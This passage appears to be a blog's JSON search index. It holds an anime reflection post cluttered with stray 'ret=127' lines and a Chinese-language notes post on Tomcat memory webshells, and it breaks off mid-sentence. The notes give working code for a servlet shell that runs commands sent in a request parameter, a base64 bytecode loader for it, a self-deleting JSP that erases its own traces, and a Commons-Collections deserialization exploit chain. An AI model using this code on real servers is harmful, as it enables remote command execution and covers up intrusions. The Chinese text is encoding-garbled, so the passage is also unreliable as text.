[{"categories":[],"contents":"16å¹´re0åˆšæ’­çš„æ—¶å€™æ­£å¥½æ˜¯åˆä¸‰ï¼Œè¿˜å¤„åœ¨ç‹‚çƒ­çš„ä¸­äºŒæœŸï¼ˆæ‚²ï¼‰ï¼Œå‡ºç¬¬äºŒå­£çš„æ—¶å€™ä¸Šäº†å¤§å­¦ï¼Œç°åœ¨ï¼Œæˆ‘åœ¨å¤§äºŒçš„æœ«å°¾é‡çœ‹è¿™ä¸¤å­£ï¼Œå¿ƒå¢ƒå’Œä¹‹å‰å¾ˆä¸ä¸€æ ·\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\n","date":"2022-06-09T23:41:38+08:00","permalink":"https://amiaaaz.github.io/relax/emiriatan-maji-tenshi/","section":"relax","tags":[],"title":"äºŒåˆ·Re0æ‰€æ„Ÿ"},{"categories":["NOTES\u0026SUMMARY"],"contents":"å„è·¯åšå®¢æ²¡å°‘çœ‹ï¼Œè¸©çš„å‘æ€ä¹ˆè¿˜è¶…çº§å¤šå‘¢â€¦â€¦æ‰€æœ‰å‚è€ƒé“¾æ¥é™„åœ¨æ–‡æœ«\næœ¬æ–‡æ¶‰åŠåˆ°çš„Javaç¯å¢ƒ\u0026amp;ç›¸å…³ä¾èµ–ï¼Œä»…ä¾›å‚è€ƒï¼š\nJava 1.8.0_311 (8u311)\ntomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73\ncommons-collections 3.2.1\njavassist 3.20.0-GA\njsp\u0026amp;æ–‡ä»¶è½åœ° å¯èƒ½å¾ˆå¤šäººä¼šè§‰å¾—ï¼šéƒ½å†…å­˜é©¬äº†æ€ä¹ˆè¿˜èƒ½æ–‡ä»¶è½åœ°ï¼Ÿï¼Ÿï¼Ÿ\næœ‰ä¸€è¯´ä¸€ï¼Œç¡®å®ï¼Œä½†é€»è¾‘ä¸æ˜¯è¿™æ ·è®²çš„ï¼šåº”è¯¥æ˜¯å†…å­˜é©¬å¯ä»¥åšåˆ°æ–‡ä»¶ä¸è½åœ°â€”â€”ä¹Ÿå°±æ˜¯è¯´åˆ é™¤ä¸Šé©¬æ—¶å‡­å€Ÿçš„.java .jsp .classæ–‡ä»¶åä¸€æ ·å¯ä»¥è¿è¡Œäºå†…å­˜ä¸­å¹¶æ‰§è¡Œå‘½ä»¤ï¼ˆé™¤éå•ç‹¬killï¼‰ï¼Œè€Œä¸Šé©¬çš„è¿‡ç¨‹ä¸­æ ¹æ®ä½¿ç”¨æ‰‹æ®µçš„ä¸åŒä¼šäº§ç”Ÿä¸€å®šç¨‹åº¦çš„æ–‡ä»¶è½åœ°\nå¯¹äºjspæ¥è¯´ï¼Œä¸€å®šä¼šåœ¨åˆæ¬¡è¯·æ±‚æ—¶è¢«tomcatè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„.javaå’Œ.classæ–‡ä»¶å¹¶æ”¾åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œæ¯•ç«Ÿjspæœ¬è´¨å°±æ˜¯ä¸€ä¸ªServletï¼ŒåŸºäºæ­¤ï¼Œæ‰€æœ‰çš„jsp webshelléƒ½ä¼šäº§ç”Ÿæ–‡ä»¶è½åœ°ï¼ˆé™¤éè‡ªåˆ é™¤ å‚è§åé¢çš„ä¸‰çº§æ ‡é¢˜ï¼‰\nè€Œjsp webshellï¼Œä¸‰æ¢¦å¸ˆå‚…çš„éƒ½0202å¹´äº†è€å—¨è¿˜åœ¨ç”¨çš„ - å„ç§å§¿åŠ¿jsp webshellå·²ç»æ€æ­»äº†æ¯”èµ›ï¼Œä¸‹é¢æˆ‘ä»¬é‡ç‚¹æ¥çœ‹å†…å­˜é©¬\nè™šå‡çš„jsp ä»£ç å‚è€ƒè‡ªJAVAå†…å­˜é©¬çš„â€œä¸€ç”Ÿâ€\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt; \u0026lt;% final String name = \u0026#34;servletshell\u0026#34;; // è·å–ä¸Šä¸‹æ–‡ ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // æ³¨å†ŒServletå¯¹è±¡ å¹¶é‡å†™serviceæ–¹æ³• Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); // getä¼ å…¥cmdå‚æ•° // ç¡®å®šç›®æ ‡æ“ä½œç³»ç»Ÿ boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[] {\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[] {\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; // ç¡®å®šå‘½ä»¤æ‰§è¡Œçš„æ ¼å¼ // å¤„ç†è¾“å…¥\u0026amp;å‘½ä»¤æ‰§è¡Œ InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); // å›æ˜¾æ‰§è¡Œç»“æœ Scanner s = new Scanner( in ).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } @Override public String getServletInfo() { return null; } @Override public void destroy() { } }; // åˆ›å»ºWrapperå¯¹è±¡æ¥å°è£…å‰é¢new Servletå¯¹è±¡ org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); // ä¸ºå†…å­˜é©¬æ·»åŠ è·¯ç”±æ˜ å°„ standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\u0026#34;/servletmemshell\u0026#34;,name); response.getWriter().write(\u0026#34;inject success\u0026#34;); %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;servletshell\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¾ˆå¥½ç†è§£ï¼Œé€šè¿‡æ³¨å†ŒServletå¹¶é‡å†™serviceæ–¹æ³•æ¥åšåˆ°å‘½ä»¤æ‰§è¡Œ+å›æ˜¾ï¼Œè®¿é—®ä¸€æ¬¡è¿™ä¸ªjspå°±å¯ä»¥æ·»åŠ Servletç±»å‹å†…å­˜é©¬åˆ°/servletmemshellè·¯å¾„ä¸‹ï¼Œä½†æˆ‘ä»¬å€ŸåŠ©java-memshell-scannerå°±å¯ä»¥å‘ç°äº‹æƒ…æ²¡æˆ‘ä»¬æƒ³çš„é‚£ä¹ˆå®Œç¾\næŠŠå®ƒdumpä¸‹æ¥\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.apache.jsp; import java.io.IOException; import java.io.InputStream; import java.io.PrintWriter; import java.util.Scanner; import javax.servlet.Servlet; import javax.servlet.ServletConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; class test_jsp$1 implements Servlet { test_jsp$1(test_jsp var1) { this.this$0 = var1; } public void init(ServletConfig servletConfig) throws ServletException { } public ServletConfig getServletConfig() { return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = (new Scanner(in)).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo() { return null; } public void destroy() { } } å¯ä»¥è¯´æ‰€è°“çš„â€œå†…å­˜é©¬â€æ˜¾éœ²æ— ç–‘ï¼Œè¢«çœ‹çš„å¹²å¹²å‡€å‡€\nç©¶å…¶åŸå› å¹¶ä¸å¤æ‚ï¼Œè¿™é‡Œdumpä¸‹æ¥çš„test_jsp$1.classæ–‡ä»¶å°±æ˜¯jspé©¬ä¸­Servlet servlet = new Servlet(){}çš„éƒ¨åˆ†ï¼Œå®ƒå®ç°äº†servletshellçš„ä¸»è¦åŠŸèƒ½ï¼›è€Œå› ä¸ºServletç›´æ¥è¢«æ³¨å†Œåˆ°å½“å‰ä¸Šä¸‹æ–‡ä¸­äº†ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ‰‹åŠ¨åˆ é™¤è¿™ä¸ªjspå’Œé™„å¸¦çš„æ‰€æœ‰.classæ–‡ä»¶åä¼šå‘ç°/servletshellè·¯å¾„ä¸‹çš„å†…å­˜é©¬ä¾æ—§å¯ä»¥ç…§å¸¸å·¥ä½œï¼Œmemshell scannerä¼šè¿™æ ·æ˜¾ç¤º\nçœŸ Â· å†…å­˜é©¬ï¼Œä¸è¿‡åªè¦ä½¿ç”¨memshell scannerçš„killåŠŸèƒ½ï¼ˆä»ä¸Šä¸‹æ–‡ä¸­è§£ç»‘Servletï¼‰å³å¯æ€æ‰è¿™ä¸ªé©¬ï¼Œå¹¶ä¸”ç”±äºæ­¤å‰åˆ æ‰äº†ä¸Šé©¬æ‰€ç”¨çš„.jspæ–‡ä»¶ï¼Œæ‰€ä»¥åšåˆ°äº†å½»åº•æ¸…é™¤servletshell\nå­—èŠ‚ç jsp å¯èƒ½æœ‰å¸ˆå‚…èƒ½çœ‹å‡ºé—®é¢˜æ‰€åœ¨ï¼šè¿™å°±ç¦»è°±ï¼Œä½ å†…å­˜é©¬éƒ½ä¸ç”¨ä¸ªå­—èŠ‚ç åŠ è½½ è¿™è‚¯å®šä¼šè¿ç€jspæ–‡ä»¶ä¸€èµ·è¢«ç¼–è¯‘å•Šï¼Ÿï¼Ÿï¼Ÿ\næœ‰ä¸€è¯´ä¸€ï¼Œç¡®å®ï¼Œé‚£æˆ‘ä»¬æŠŠä¸Šé¢çš„åœ¨jspå†…ç›´æ¥new Servletçš„åšæ³•æ¢åšå­—èŠ‚ç çš„å½¢å¼\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt; \u0026lt;% String classCode = \u0026#34;yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==\u0026#34;; // è·å–ä¸Šä¸‹æ–‡ ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] evil = java.util.Base64.getDecoder().decode(classCode); Class\u0026lt;?\u0026gt; servletClass = (Class\u0026lt;?\u0026gt;) defineClass.invoke(classLoader, evil, 0, evil.length); final String name = \u0026#34;servletshell\u0026#34;; // ä½¿ç”¨ Wrapper å°è£… Servlet org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper(); newWrapper.setName(name); newWrapper.setLoadOnStartup(1); newWrapper.setServlet((Servlet) servletClass.newInstance()); newWrapper.setServletClass(servletClass.getName()); // ä¸ºå†…å­˜é©¬æ·»åŠ è·¯ç”±æ˜ å°„ standardContext.addChild(newWrapper); standardContext.addServletMappingDecoded(\u0026#34;/servletmemshell\u0026#34;,name); response.getWriter().write(\u0026#34;inject success\u0026#34;); %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;servletshell\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¸è¿‡å¹¶æ²¡æœ‰çœ‹èµ·æ¥è¿™ä¹ˆç¾å¥½â€”â€”æœåŠ¡å™¨ä¸Šä¸€ä¸‹å­å¤šäº†1ä¸ªjsp 1ä¸ªclass 1ä¸ªjava\né‡‘è‰è„±å£³çš„jsp å¯¹äºä¸Šé¢ç¤ºèŒƒçš„åŠ¨é™è¾ƒå¤§çš„2ç§æ–¹å¼ä¸èƒ½è¯´ä¸€æ— æ˜¯å¤„å§ï¼Œåªèƒ½è¯´æ˜¯ä¹å–„å¯é™ˆï¼Œè€Œåœ¨Tomcatå®¹å™¨æ”»é˜²ç¬”è®°ä¹‹JSPé‡‘è‰è„±å£³è¿™ç¯‡æ–‡ç« ä¸­ä½œè€…æå‡ºäº†jspé‡‘è‰è„±å£³çš„æ€è·¯ï¼Œä»£ç å¦‚ä¸‹\n\u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.mapper.MappingData\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Wrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.compiler.JspRuntimeContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.concurrent.ConcurrentHashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.servlet.JspServletWrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.jasper.JspCompilationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.File\u0026#34; %\u0026gt; \u0026lt;% //ä»requestå¯¹è±¡ä¸­è·å–requestå±æ€§ Field requestF = request.getClass().getDeclaredField(\u0026#34;request\u0026#34;); requestF.setAccessible(true); Request req = (Request) requestF.get(request); //è·å–MappingData MappingData mappingData = req.getMappingData(); //è·å–StandrardWrapper Field wrapperF = mappingData.getClass().getDeclaredField(\u0026#34;wrapper\u0026#34;); wrapperF.setAccessible(true); Wrapper wrapper = (Wrapper) wrapperF.get(mappingData); //è·å–jspServletå¯¹è±¡ Field instanceF = wrapper.getClass().getDeclaredField(\u0026#34;instance\u0026#34;); instanceF.setAccessible(true); Servlet jspServlet = (Servlet) instanceF.get(wrapper); //è·å–rctxtå±æ€§ Field rctxt = jspServlet.getClass().getDeclaredField(\u0026#34;rctxt\u0026#34;); rctxt.setAccessible(true); JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet); //è·å–jspså±æ€§å†…å®¹ Field jspsF = jspRuntimeContext.getClass().getDeclaredField(\u0026#34;jsps\u0026#34;); jspsF.setAccessible(true); ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext); //è·å–å¯¹åº”çš„JspServletWrapper JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath()); //è·å–ctxtå±æ€§ä¿å­˜çš„JspCompilationContextå¯¹è±¡ Field ctxt = jsw.getClass().getDeclaredField(\u0026#34;ctxt\u0026#34;); ctxt.setAccessible(true); JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw); File targetFile; targetFile = new File(jspCompContext.getClassFileName());\t//åˆ æ‰jspçš„.class targetFile.delete(); targetFile = new File(jspCompContext.getServletJavaFileName());\t//åˆ æ‰jspçš„javaæ–‡ä»¶ targetFile.delete(); //åˆ é™¤jspæ–‡ä»¶ String __jspName = this.getClass().getSimpleName().replaceAll(\u0026#34;_\u0026#34;, \u0026#34;.\u0026#34;); String path=application.getRealPath(__jspName); File file = new File(path); file.delete(); %\u0026gt; é€šè¿‡å¤§é‡çš„åå°„ä¿®æ”¹tomcatå¯¹jspç¼–è¯‘æ—¶çš„ä¸€äº›è®¾ç½®ï¼Œåšåˆ°ä¸Šé©¬ååˆ é™¤è‡ªèº«jspå¹¶è·³è¿‡jspç¼–è¯‘ä¸ºclasså’Œjavaæ–‡ä»¶çš„è¿‡ç¨‹ï¼Œå¯ä»¥å®Œå…¨ä¸ç•™ç—•â€”â€”å¥½ï¼ï¼å¾ˆæœ‰ç²¾ç¥ï¼ï¼ï¼\nååºåˆ—åŒ– è™½ç„¶å‰é¢æˆ‘ä»¬å¾—åˆ°äº†å¯ä»¥åˆ é™¤è‡ªèº«çš„é‡‘è‰è„±å£³jspï¼Œä½†æœ‰ä¸ªçµé­‚æ‹·é—®â€”â€”å¦‚æœèƒ½ä¼ jspäº†ä¸ºä»€ä¹ˆä¸ç›´æ¥ä¼ å†°èï¼Ÿç¡®å®ï¼Œå®é™…åœºæ™¯/CTFä¸­æ›´å¤šçš„æ˜¯ååºåˆ—åŒ–RCEï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬å¯èƒ½ä¼šæ¥ç€ä¸Šå†…å­˜é©¬ï¼Œå¦‚æœèƒ½å†æ‰©å±•ä¸€ä¸‹å†°èæˆ–å“¥æ–¯æ‹‰é‚£å°±æ›´å¥½äº†\nä»¥CC11é“¾ä¸ºä¾‹ï¼Œè¿™æ˜¯å®ƒçš„åŸºæœ¬é“¾\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; @SuppressWarnings(\u0026#34;all\u0026#34;) public class CC11 { protected static byte[] getBytescode() throws Exception { // åˆ©ç”¨javassiståŠ¨æ€åˆ›å»ºæ¶æ„å­—èŠ‚ç  ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTranslet é¿å…æŠ¥é”™ return cc.toBytecode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{getBytescode()}); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;name\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); InvokerTransformer transformer = new InvokerTransformer(\u0026#34;asdfasdfasdf\u0026#34;, new Class[0], new Object[0]);\t// å ä½ LazyMap map = (LazyMap)LazyMap.decorate(new HashMap(),transformer); TiedMapEntry tiedmap = new TiedMapEntry(map,templates); HashSet hashset = new HashSet(1); hashset.add(\u0026#34;foo\u0026#34;); Field f = null; try { f = HashSet.class.getDeclaredField(\u0026#34;map\u0026#34;); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\u0026#34;backingMap\u0026#34;); } f.setAccessible(true); HashMap hashset_map = (HashMap) f.get(hashset); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\u0026#34;table\u0026#34;); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\u0026#34;elementData\u0026#34;); } f2.setAccessible(true); // æ›¿æ¢keyä¸ºTiedMap Object[] array = (Object[])f2.get(hashset_map); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ setFieldValue(node, \u0026#34;key\u0026#34;, tiedmap); }catch(Exception e){ keyField = Class.forName(\u0026#34;java.util.MapEntry\u0026#34;).getDeclaredField(\u0026#34;key\u0026#34;); keyField.setAccessible(true); keyField.set(node,tiedmap); } // æ›¿æ¢ é˜²æ­¢ç”Ÿæˆpayloadçš„æ—¶å€™å°±è§¦å‘rce setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;./cc11\u0026#34;)); outputStream.writeObject(hashset); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;./cc11\u0026#34;)); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } å…·ä½“çš„æˆ‘å°±ä¸å¤šåˆ†æäº†ï¼Œå¯ä»¥è¿‘ä¼¼ä¸ºCC2+CC6ï¼Œç”¨TemplatestImplåŠ è½½å­—èŠ‚ç ï¼Œæ¶æ„ç±»ç”±javassistç”Ÿæˆ\nå¦‚ä½•æ‰©å±•è¿™ä¸ªçœ‹èµ·æ¥åªèƒ½æ‰§è¡Œå•å¥æŒ‡ä»¤çš„ç®€æ˜“pocï¼Ÿç®€å•ï¼Œæˆ‘ä»¬å°†tomcat 